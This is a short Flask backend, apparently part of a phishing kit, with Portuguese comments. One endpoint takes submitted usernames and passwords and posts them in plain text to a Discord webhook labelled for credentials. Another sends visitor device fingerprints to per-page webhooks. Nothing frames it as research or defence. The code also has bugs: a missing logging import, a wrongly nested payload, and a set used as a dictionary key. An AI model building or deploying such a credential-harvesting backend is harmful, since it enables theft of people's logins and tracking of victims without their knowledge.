from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests

logger = logging.getLogger(__name__)
app = Flask(__name__)

CORS(app)  # Habilita CORS para todas as origens

# DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
DISCORD_WEBHOOK_URL_INDEX = os.getenv('DISCORD_WEBHOOK_URL_INDEX')
DISCORD_WEBHOOK_URL_LOGIN = os.getenv('DISCORD_WEBHOOK_URL_LOGIN')
DISCORD_WEBHOOK_URL_CREDENTIALS = os.getenv('DISCORD_WEBHOOK_URL_CREDENTIALS')
DISCORD_WEBHOOK_URL_NEXT = os.getenv('DISCORD_WEBHOOK_URL_NEXT')

@app.route('/send-message', methods=['POST'])
def send_message():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"error": "Campos obrigatórios ausentes"}), 400

    message = {
        "content": (
            f"------------------------------------------------------------------\n"
            f"**DADOS RECEBIDOS:**\n"
            f"Usuário: {username}\n"
            f"Senha: {password}\n"
            f"------------------------------------------------------------------\n"
        )
    }

    payload = {"content": message}
    response = requests.post(DISCORD_WEBHOOK_URL_CREDENTIALS, json=payload)

    if response.status_code == 204:
        return jsonify({"success": "Mensagem enviada ao Discord"}), 200
    else:
        return jsonify({"error": "Falha ao enviar mensagem", "details": response.text}), 500

@app.route('/device-info', methods=['POST'])
def device_info():
    data = request.json

    # Criar a mensagem com as informações do dispositivo
    message = (
        f"**Acesso detectado ao {data.get('page')}**\n"
        f"**Sistema:** {data.get('platform')}\n"
        # f"**Idioma:** {data.get('language')}\n"
        f"**Resolução:** {data.get('screenWidth')}x{data.get('screenHeight')}\n"
        # f"**Fuso horário:** {data.get('timezone')}\n"
        f"**User-Agent:** {data.get('userAgent')}"
    )
    payload = {"content": message}

    # Enviar para o Discord
    whereami = {data.get('page')}
    mapping = {
        "index": DISCORD_WEBHOOK_URL_INDEX,
        "login": DISCORD_WEBHOOK_URL_LOGIN,
        "next": DISCORD_WEBHOOK_URL_NEXT
    }
    DISCORD_WEBHOOK_URL = mapping.get(whereami, "")
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

    if response.status_code == 204:
        return jsonify({"success": "Informações enviadas ao Discord"}), 200
    else:
        return jsonify({"error": "Falha ao enviar mensagem", "details": response.text}), 500

if __name__ == '__main__':
    app.run(debug=True)
